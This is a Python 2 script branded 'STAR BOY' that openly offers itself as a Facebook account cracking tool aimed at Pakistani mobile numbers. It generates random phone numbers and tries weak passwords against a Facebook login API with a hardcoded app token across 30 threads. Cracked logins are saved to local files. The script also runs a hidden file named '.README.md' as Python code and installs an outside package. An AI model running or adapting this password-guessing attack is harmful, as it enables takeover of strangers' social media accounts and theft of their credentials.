import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(1500):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print(nmbr)
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 9; SM-G955U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36 Instagram 153.0.0.34.96 Android (28/9; 420dpi; 1080x2094; samsung; SM-G955U; dream2qltesq; qcom; en_US; 236572377;]')] 
def exb():
    print '[!] Exit Successfully'
    os.sys.exit()


def exxb():
    print '[!] \x1b[1;91mTHIS OPTION NOT AVAILABLE AT THE MOMENT.BUT \x1b[3;92;40m COM\x1b[1;95mING SO\x1b[1;97mON \x1b[1;91m\x1b[0;34;40m'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.02)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;93mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.10)


def lodhirt():
    lodhirt = [
     'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND\n']
    for o in lodhirt:
        print '\r\x1b[1;94m                     \x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.1)


def jaalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(2.0 / 9900)


def t():
    time.sleep(1)


def cb():
 os.system('clear')
logo = """
\033[1;91m _______ _________ _______  _______ 
\033[1;92m(  ____ \\__   __/(  ___  )(  ____ )
\033[1;93m| (    \/   ) (   | (   ) || (    )|
\033[1;94m| (_____    | |   | (___) || (____)|
\033[1;95m(_____  )   | |   |  ___  ||     __)
\033[1;96m      ) |   | |   | (   ) || (\ (   
\033[1;93m/\____) |   | |   | )   ( || ) \ \__
\033[1;92m\_______)   )_(   |/     \||/   \__/
\033[1;91m______  _____ __   __
\033[1;92m| ___ \|  _  |\ \ / /
\033[1;93m| |_/ /| | | | \ V / 
\033[1;94m| ___ \| | | |  \ /  
\033[1;95m| |_/ /\ \_/ /  | |  
\033[1;96m\____/  \___/   \_/  
"""
logo1 = """
\033[1;91m  ___             
\033[1;92m / _ \            
\033[1;93m/ /_\ \ _ __ ___  
\033[1;94m|  _  || '_ ` _ \ 
\033[1;95m| | | || | | | | |
\033[1;96m\_| |_/|_| |_| |_|
\033[1;91m ______   _______  _______  _        ______  
\033[1;92m(  ___ \ (  ____ )(  ___  )( (    /|(  __  \ 
\033[1;93m| (   ) )| (    )|| (   ) ||  \  ( || (  \  )
\033[1;96m| (__/ / | (____)|| (___) ||   \ | || |   ) |
\033[1;94m|  __ (  |     __)|  ___  || (\ \) || |   | |
\033[1;95m| (  \ \ | (\ (   | (   ) || | \   || |   ) |
\033[1;91m| )___) )| ) \ \__| )   ( || )  \  || (__/  )
\033[1;92m|/ \___/ |/   \__/|/     \||/    )_)(______
╓╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╥╖
 ▌                                                                                                                                          ▌        
 ▌DEVOLPER  SOMI AWAN                                                                                       ▌
♦WHATSAPP 03455453538                                                                                   ♦
 ▌FACEBOOK Somi Awan                                                                                          ▌
 ▌                                                                                                                                          ▌
╙╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨╨┘
                                             
                                             
                  
                  

\033[1;47m\033[1;34m           SELECT PAKISTAN SIM CODE            \033[1;0m   

\033[4;97mMOBILINK/JAZZ CODE HERE\033[1;0m
\033[1;91m[\xe2\x97\x8f]\033[1;96m00, 01, 02, 03, 04,
\033[1;91m[\xe2\x97\x8f]\033[1;93m05, 06, 07, 08, 09,
\033[4;97mTELINORE CODE HERE\033[1;0m
\033[1;91m[\xe2\x97\x8f]\033[1;96m40, 41, 42, 43, 44,
\033[1;91m[\xe2\x97\x8f]\033[1;93m45, 46, 47 ,48 ,49,
\033[4;97mWARID CODE HERE\033[1;0m
\033[1;91m[\xe2\x97\x8f]\033[1;96m20, 21, 22, 23,
\033[1;91m[\xe2\x97\x8f]\033[1;93m24, ??, ??, ??,
\033[4;97mUFONE CODE HERE\033[1;0m
\033[1;91m[\xe2\x97\x8f]\033[1;96m31, 32, 33, 34,
\033[1;91m[\xe2\x97\x8f]\033[1;93m35, 36, 37, ??,
\033[4;97mZONG CODE HERE\033[1;0m
\033[1;91m[\xe2\x97\x8f]\033[1;96m10, 11, 12, 13,
\033[1;91m[\xe2\x97\x8f]\033[1;93m14, 15, 16, 17,


"""




back = 0
back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    print
    print 47* '\033[1;94m='
    print
    jaalan('\x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;93mPAKISTAN ACCOUNT CRACKING')
    print 47* '\033[1;93m_'
    print
    jaalan('\x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;96mUPDATE STAR BOY PROGRAM')
    print 47* '\033[1;96m_'
    print
    jaalan('\x1b[1;91m[\x1b[1;92m0\x1b[1;91m] \x1b[1;91mSTOP PROGRAM ')
    print 47* '\033[1;91m_'
    print
    print 47* '\033[1;94m='
    action()


def action():
    global oks
    global cpb
    Somi = raw_input('\n\n \x1b[1;96m>   ')
    if Somi == '':
        print '[!] STAR BOY WARNING'
        action()
    elif Somi == '1':
        tik()
        os.system('clear')
        print logo1
        print
        try:
            c = raw_input('\033[1;93mWRITE CODE\033[1;96m:  ')
            k = '+923'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif Somi == '2':
        tik()
        os.system('clear')
        os.system('pip2 install --upgrade Dream-boy')
        os.system('clear')
        print logo
        print
        psb(' Tool has been successfully updated \n Enjoy with Star boy')
        time.sleep(1)
        os.system('python2 .README.md')
        menu()
    elif Somi== '0':
        exb()
    else:
        print '[!] WARNING STAR BOY'
        action()
    print 47* '\033[1;97m_'
    xxx = str(len(id))
    psb('[\xe2\x9c\x93]\033[1;92m TOTAL NUMBERS: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93]\033[1;93m PLEASE WAIT, PROCESS IS START...')
    time.sleep(0.5)
    psb('[!]\033[1;96m TO STOP THIS PROCESS PRESS Ctrl THEN z')
    time.sleep(0.5)
    print 47* '\033[1;97m_'
    
    print logo
    print 47* '\033[1;97m_'
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/group/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;92m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/group/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass2 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;92m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass2 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '786786786'
                    data = br.open('https://b-api.facebook.com/group/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass3 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;92m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass3 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '-'
    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
    print '[\\033[1;91m[\xe2\x97\x8f]xe2\x9c\x93] \x1b[1;96mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : save/checkpoint.txt'
    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
    os.system('python2 .README.md')


if __name__ == '__main__':
    menu()
